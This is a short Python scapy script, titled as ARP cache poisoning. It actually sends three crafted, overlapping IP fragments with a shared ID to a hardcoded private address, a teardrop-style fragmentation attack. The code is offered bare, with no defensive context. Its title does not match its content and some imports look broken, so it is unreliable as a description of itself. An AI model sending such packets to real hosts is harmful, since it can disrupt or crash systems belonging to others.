# ARP cache poisoning


from urllib import response
from scapy.all import scapy
from scapy.all import IP
from scapy.all import ICMP
from scapy.all import *
ip='10.197.225.120'
subnet = '10.197.224.0/23'



send(IP(dst=ip, id=42, flags="MF")/UDP()/("X"*10))
send(IP(dst=ip, id=42, frag=48)/("X"*116))
send(IP(dst=ip, id=42, flags="MF")/UDP()/("X"*224))